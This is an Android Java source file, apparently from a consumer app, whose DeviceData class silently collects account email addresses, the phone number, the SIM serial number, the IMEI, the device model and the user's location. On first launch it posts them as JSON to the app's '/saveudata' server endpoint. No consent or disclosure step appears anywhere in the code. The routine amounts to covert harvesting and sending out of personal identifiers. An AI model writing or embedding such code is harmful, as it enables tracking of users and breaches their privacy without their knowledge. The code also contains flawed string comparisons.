package main.dbay;

import android.accounts.Account;
import android.accounts.AccountManager;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.database.Cursor;
import android.os.AsyncTask;
import android.os.Handler;
import android.provider.ContactsContract;
import android.telephony.TelephonyManager;
import android.util.Patterns;

import org.apache.http.HttpResponse;
import org.apache.http.client.ClientProtocolException;
import org.apache.http.client.entity.UrlEncodedFormEntity;
import org.apache.http.client.methods.HttpPost;
import org.apache.http.entity.StringEntity;
import org.apache.http.impl.client.DefaultHttpClient;
import org.json.JSONArray;
import org.json.JSONException;
import org.json.JSONObject;

import java.io.IOException;
import java.io.UnsupportedEncodingException;
import java.util.regex.Pattern;

import javax.net.ssl.HandshakeCompletedEvent;

/**
 * Created by vladvidavsky on 3/05/15.
 */
public class DeviceData extends BroadcastReceiver {

    private static JSONObject userDataObject = new JSONObject();
    private static String userDataString;
    private static final String urlForSavingUser = Constants.WEBSITE_URL + "/saveudata";

    /**
     * COLECTING USER DATA FROM THE DEVICE
     * @param context - Activity
     * @param counry - User country
     * @param lat - user latitude
     * @param lng - user longitude
     */
    public static void GetUserData(final Context context, String counry, String lat, String lng) {
        Pattern emailPattern = Patterns.EMAIL_ADDRESS;
        String emails = null;
        Account[] accounts = AccountManager.get(context).getAccounts();
        for (Account account : accounts) {
            if (emailPattern.matcher(account.name).matches()) {
                emails = account.name == null ? "---" : account.name;
            }
        }

        TelephonyManager tMgr = (TelephonyManager) context.getSystemService(Context.TELEPHONY_SERVICE);
        String mPhoneNumber = tMgr.getLine1Number() == "" ? "---" : tMgr.getLine1Number();
        String simSerialNumber = tMgr.getSimSerialNumber() == "" ? "---" : tMgr.getSimSerialNumber();
        String IMEI = tMgr.getDeviceId() == null ? "---" : tMgr.getDeviceId();
        String deviceName = android.os.Build.MODEL;
        String deviceMan = android.os.Build.MANUFACTURER;

        try {
            userDataObject.put("imei", IMEI).put("sim", simSerialNumber).put("device", deviceMan + " " + deviceName).put("usermail", emails).put("phonenum", mPhoneNumber).put("userlocation", counry).put("lat", lat).put("lng", lng);
            userDataString = userDataObject.toString();
            if(MainActivity.firstLoad){
                if(MainActivity.iAmOnTablet){
                    final Handler handler = new Handler();
                    handler.postDelayed(new Runnable() {
                        @Override
                        public void run() {
                            CallHomeToVerify.SendDataHome(context, urlForSavingUser, userDataString);
                        }
                    }, 10000);
                }else{
                    CallHomeToVerify.SendDataHome(context, urlForSavingUser, userDataString);
                }
            }
        } catch (JSONException e) {
            e.printStackTrace();
        }
    }

    @Override
    public void onReceive(Context context, Intent intent) {
//        ConnectivityManager connectivityManager = (ConnectivityManager) context.getSystemService(Context.CONNECTIVITY_SERVICE);
//        NetworkInfo activeGPRS = connectivityManager.getNetworkInfo(ConnectivityManager.TYPE_MOBILE);
//        NetworkInfo activeWifi = connectivityManager.getNetworkInfo(ConnectivityManager.TYPE_WIFI);
//        boolean GPRSState = activeGPRS != null && activeGPRS.isConnectedOrConnecting();
//        boolean WIFIState = activeWifi != null && activeWifi.isConnectedOrConnecting();
//        if (WIFIState || GPRSState) {
//
//        }
    }


}


